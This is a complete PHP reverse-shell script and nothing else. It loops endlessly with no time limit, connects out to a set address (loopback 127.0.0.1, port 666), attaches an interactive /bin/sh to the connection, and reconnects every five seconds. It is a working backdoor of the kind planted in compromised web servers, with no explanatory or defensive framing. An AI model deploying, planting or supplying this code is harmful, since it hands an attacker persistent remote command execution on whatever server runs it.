<?php
set_time_limit(0);
$ip   = '127.0.0.1';
$port = 666;

while (true) {
    $sock = @fsockopen($ip, $port, $errno, $errstr, 30);
    if ($sock) {
        $proc = proc_open('/bin/sh -i', [
            0 => $sock,
            1 => $sock,
            2 => $sock
        ], $pipes);
        proc_close($proc);
        fclose($sock);
    }
    sleep(5);
}
?>
